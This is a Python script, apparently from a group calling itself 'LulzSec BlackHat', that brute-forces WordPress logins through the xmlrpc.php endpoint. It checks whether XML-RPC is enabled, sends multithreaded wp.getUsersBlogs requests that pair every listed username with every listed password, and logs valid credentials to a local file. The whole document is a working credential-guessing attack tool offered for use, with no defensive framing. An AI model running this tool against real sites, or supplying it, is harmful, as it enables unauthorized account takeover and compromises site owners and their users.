import requests
import xml.etree.ElementTree as ET
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys
from pathlib import Path
from pyfiglet import Figlet
from datetime import datetime

# Emojis e estilo
USE_EMOJIS = True
OUTPUT_DIR = Path("output")
RESULT_FILE = OUTPUT_DIR / "result.txt"

def banner():
    f = Figlet(font='slant')
    print(f.renderText('WP XML-RPC\nBrute Tool'))
    print("     by LulzSec BlackHat Grupo 🐍\n")
    print("Telegram: https://t.me/lulzsec_blackhat_team\n")

def status(msg, symbol="[*]"):
    print(f"{symbol} {msg}")

def build_payload(user, password):
    return f'''<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>{user}</string></value></param>
    <param><value><string>{password}</string></value></param>
  </params>
</methodCall>'''

def is_valid_response(response_text):
    return "<name>isAdmin</name>" in response_text or "<name>blogName</name>" in response_text

def attempt_login(url, username, password):
    headers = {"Content-Type": "text/xml"}
    xml = build_payload(username, password)

    try:
        response = requests.post(url, data=xml, headers=headers, timeout=10)
        if is_valid_response(response.text):
            return (username, password, "SUCCESS")
        elif "faultString" in response.text:
            try:
                root = ET.fromstring(response.text)
                fault = root.find(".//string").text
                return (username, password, f"FAIL -> {fault}")
            except:
                return (username, password, "FAIL -> Unknown XML error")
        else:
            return (username, password, "FAIL -> Unknown response")
    except Exception as e:
        return (username, password, f"ERROR -> {str(e)}")

def check_xmlrpc_enabled(url):
    test_payload = '''<?xml version="1.0"?>
<methodCall>
  <methodName>demo.sayHello</methodName>
</methodCall>'''
    try:
        r = requests.post(url, data=test_payload, headers={"Content-Type": "text/xml"}, timeout=10)
        if "methodResponse" in r.text or "faultString" in r.text:
            return True
        return False
    except Exception as e:
        status(f"Erro ao verificar xmlrpc.php: {e}", "❌")
        return False

def save_result(username, password, url):
    OUTPUT_DIR.mkdir(exist_ok=True)
    with open(RESULT_FILE, "a") as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] SUCCESS: {username}:{password} -> {url}\n")

def load_list(path_or_list):
    if isinstance(path_or_list, list):
        return path_or_list
    path = Path(path_or_list)
    if path.exists():
        return [line.strip() for line in path.read_text().splitlines() if line.strip()]
    else:
        return path_or_list.split(",")

def main():
    banner()

    parser = argparse.ArgumentParser(description="XML-RPC Brute Forcer para WordPress")
    parser.add_argument("-u", "--url", required=True, help="URL do xmlrpc.php")
    parser.add_argument("--users", required=True, help="Lista de usuários (arquivo ou vírgula)")
    parser.add_argument("--passwords", required=True, help="Lista de senhas (arquivo ou vírgula)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Threads simultâneas")
    args = parser.parse_args()

    url = args.url
    usernames = load_list(args.users)
    passwords = load_list(args.passwords)

    # Verifica se xmlrpc.php está ativo
    status(f"Verificando xmlrpc.php em: {url}", "🔎")
    if not check_xmlrpc_enabled(url):
        status("xmlrpc.php não está ativo ou acessível. Abortando.", "❌")
        sys.exit(1)
    else:
        status("xmlrpc.php ativo! Iniciando bruteforce...", "✅")

    found = None
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for username in usernames:
            status(f"Bruteforce em: {username}", "🔍" if USE_EMOJIS else "[*]")
            for password in passwords:
                futures.append(executor.submit(attempt_login, url, username, password))

        for future in as_completed(futures):
            username, password, result = future.result()
            if "SUCCESS" in result:
                status(f"SUCESSO: {username}:{password}", "✅")
                save_result(username, password, url)
                found = (username, password)
                break
            else:
                status(f"{username}:{password} -> {result}", "✖️" if USE_EMOJIS else "[x]")

    if found:
        status(f"[FINAL] Acesso válido encontrado: {found[0]}:{found[1]}", "🚪")
    else:
        status("[FINAL] Nenhum login válido encontrado.", "❌")

if __name__ == "__main__":
    main()
